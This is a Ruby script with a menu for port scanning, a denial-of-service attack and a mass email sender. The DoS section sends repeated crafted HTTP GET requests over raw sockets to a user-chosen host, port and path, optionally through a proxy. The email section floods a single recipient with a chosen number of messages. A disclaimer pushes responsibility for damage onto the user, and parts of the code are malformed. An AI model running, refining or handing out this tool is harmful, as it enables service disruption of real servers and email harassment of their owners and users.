require 'net/http'
require 'socket'
require 'colorize'
require 'mail'
load 'methods.rb'
#Todo:
#Add manual stop while initiating payload with input 'Stop' rather than Ctrl+C stop - returns interruption error
#Learn multi-threading for more effective payloads
#Research search specific payloads ~/Desktop/EXPLOIT NOTES.txt
#Add SSL support

puts '1) Port Scanner'
puts '2) DoS Attack'
puts '3) Mass Email Sender'
print 'Choose what action you wish to preform: '
options = gets.chomp

case options
    when '1'
        puts 'Which Address Which you like to scan?'
        host = gets.chomp #Host to scan
        puts 'Which Port would you like to check? - Note this scan currently only works with a single port, specify which port you wish to scan.'
        port = gets.chomp.to_i #Port to check - currently only works on single port
            puts is_port_open?(host, port)



    when '2' #Dos Tool
      time = Time.new # for payload time initiation
        print 'Enter IP Address: '
        host = gets.chomp  # The web server
        print 'Enter host port to attack on: '
        port = gets.chomp  # Choose which port to attack the server with
        print "Which path would you like to attack? (i.e. /index.php or /index.html be sure to add the '/') "
        path = gets.chomp  # Directory to attack

    # This the request that gets sent to the server
        request = "GET #{path} HTTP/1.1[CRLF]
                  Pragma: no-cache[CRLF]
                  Cache-Control: no-cache[CRLF]
                  Host: #{host} [CRLF]
                  Connection: Keep-alive[CRLF]
                  Accept-Encoding: gzip,deflate[CRLF]
                  User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36[CRLF]
                  Accept: */*[CRLF][CRLF"

        puts 'How many threads would you like to attack the server with?'
        thread_input = gets.chomp
        i = 0
        threads = thread_input.to_i

        #Confirms attacker has permission to distribute this payload on the targeted server
        puts 'By using this program you agree that I,the coder/programmer/writer am not responsible for any damage done or loss of service by this program, do you agree to these terms? [Yes/No]'.red
        terms_agreement = gets.chomp.capitalize
          if terms_agreement == 'Yes'
            puts 'Do you wish to use a proxy for the payload?'
            proxy_input = gets.chomp.capitalize
                  if proxy_input == 'Yes'
                    puts 'What proxy address would you like to use? (e.g. http://hidemyass.com/proxy-list/) '
                    proxy_address = gets.chomp #Proxy address to use
                    puts 'Which proxy port?'
                    proxy_port = gets.chomp #Proxy port to use
                    p = Net::HTTP::Proxy(proxy_address, proxy_port) #Configure connection
                    p.start(proxy_address) #Establish Connection
                       until i == threads                       #Loops requests to server stop when threads VAR is met
                         print "[#{time.inspect}] Initiating the attack please wait.. this will take a few moments. Type 'Stop' to cancel the payload".green
                         socket = TCPSocket.open(host,port)  # Connect to server
                         socket.print(request)               # Send request
                         response = socket.read              # Read complete response
                         headers, body = response.split("\r\n\r\n", 2) # Split response at first blank line into headers and body
                         print body                          # display body
                         i += 1                              #Incriment by 1
                       end
                  elsif proxy_input == 'No'
                      until i == threads                       #Loops requests to server stop when threads VAR is met
                          print "[#{time.inspect}] Initiating the attack please wait.. this will take a few moments. Type 'Stop' to cancel the payload".green
                           socket = TCPSocket.open(host,port)  # Connect to server
                           socket.print(request)               # Send request
                           response = socket.read              # Read complete response
                           body = response.split("\r\n\r\n", 2) # Split response at first blank line into headers and body
                           print body                          # display body
                           i += 1                              #Incriment by 1
                      end
          elsif terms_agreement == 'No' || terms_agreement == ' '
            abort('Ending the program - terms not agreed to')
          end
        end

    when '3'
          puts 'What email would you like to send the emails to?'
            input_email_recieve = gets.chomp
          puts 'What is your email?'
            input_sender_email = gets.chomp
          puts 'What is your password?'
            input_password = gets.chomp
          puts 'What STMP server will you be using? (e.g. smtp.gmail.com)'
            smtp_server = gets.chomp
          puts 'What port to you wish you act on? (e.g. 25, 465, 587)'
            smtp_port = gets.chomp.to_i
          puts 'What do you want the subject of the email to be?'
            email_subject = gets.chomp
          puts 'What do you want the body of the message to be'
            email_body = gets.chomp
          puts 'Lastly choose the amount of emails you wish to send.'
            send_amount = gets.chomp.to_i

        mail_options = { :address       => "#{smtp_server}", #SMTP server to point to
                  :port                 => "#{smtp_port}", #SMTP port
                  #:domain              => 'your.host.name', Use if running local SMTP Server
                  :user_name            => "#{input_sender_email}", #Sender username
                  :password             => "#{input_password}", #Sender password
                  :authentication       => 'plain',
                  :enable_starttls_auto => true  }
          i = 0
          until i == send_amount
                  Mail.defaults do #Initiates Email
                    delivery_method :smtp, mail_options
                  end

                  Mail.deliver do #Sends email
                    to "#{input_email_recieve}" #Reciever email
                    from "#{input_sender_email}" #Sender
                    subject "#{email_subject}" #Email Subject
                    body "#{email_body}" #Email body
          i += 1

            end
          end
        end
